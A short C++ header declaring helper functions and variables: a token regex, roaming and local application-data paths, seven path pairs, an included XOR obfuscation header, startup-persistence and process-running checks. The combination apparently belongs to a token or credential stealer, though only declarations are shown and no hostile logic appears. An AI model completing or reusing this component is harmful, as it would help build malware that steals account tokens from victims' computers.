#pragma once
#include <vector>
#include <string>
#include <array>

#include "xor.hpp"

namespace helpers {
	extern std::string regex_token;

	extern std::string roaming;

	extern std::string local;

	extern std::array<std::pair<std::string, std::string>, 7> paths;

	std::string read_file(const char* filename);

	bool check_for_startup();

	void start_process(std::string path);

	HANDLE is_process_running(const char* process_name, DWORD dwAccess);

	bool is_background_running();

}
